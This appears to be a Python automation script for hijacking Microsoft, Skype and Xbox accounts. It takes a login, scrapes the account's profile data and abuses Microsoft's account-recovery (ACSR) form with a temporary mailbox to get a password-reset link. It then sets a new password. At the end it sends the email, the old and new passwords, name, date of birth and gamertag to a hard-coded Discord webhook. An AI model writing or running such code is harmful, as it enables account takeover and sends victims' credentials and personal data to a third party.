"""from automation.core import scrape_account_info
from automation.acsr import submit_acsr_form
import os
from automation.acsr_continue import continue_acsr_flow


# Step 1: Ask user for Microsoft login
email = input("Enter Microsoft Email: ")
password = input("Enter Microsoft Password: ")
new_password = input("Enter New Password: ")

# Step 2: Scrape profile info
print("\n🔍 Scraping Microsoft, Skype, Xbox info...")
account_info = scrape_account_info(email, password)

# Error check
if "error" in account_info:
    print(f"❌ Failed to scrape: {account_info['error']}")
    exit()

# Print account info
print("\n📦 Scraped Info:")
for key, value in account_info.items():
    print(f"{key}: {value}")

# Step 3: Submit to ACSR
print("\n🚀 Submitting to ACSR form...")
captcha_img, driver, token, tempmail = submit_acsr_form(account_info)

# Error check
if not captcha_img:
    print("❌ Failed at ACSR step.")
    exit()

# Step 4: Save CAPTCHA locally
with open("captcha.png", "wb") as f:
    f.write(captcha_img.read())

print("\n✅ CAPTCHA saved as captcha.png")
print(f"📨 Temp Mail: {tempmail}")
print(f"📬 Waiting for user to solve CAPTCHA (simulate this in bot next)...")

resetlink = continue_acsr_flow(driver, account_info, token)

from automation.reset_password import perform_password_reset
if resetlink:
    new_pass = perform_password_reset(resetlink, email,new_password)

    account_info["new_password"] = new_pass
    account_info["old_password"] = password
    from automation.logger import send_webhook

    webhook_url = "https://discord.com/api/webhooks/1363376512652284064/OYlYJxvOPdmKLR9bIW8KApSTKscDvHZ9CRthPKX-NmN0D3yxd2yk039vm2xmKJvg1H7L"  # ← replace with your actual webhook URL
    results = [{
        "email": f"{email}",
        "old_password": f"{password}",
        "new_password": f"{new_pass}",
        "name": f"{account_info['name']}",
        "dob": f"{account_info['dob']}",
        "region": f"{account_info['region']}",
        "skype_id": f"{account_info['skype_id']}",
        "skype_email": f"{account_info['skype_email']}",
        "gamertag": f"{account_info['gamertag']}"
    }]

    send_webhook(results, webhook_url)"""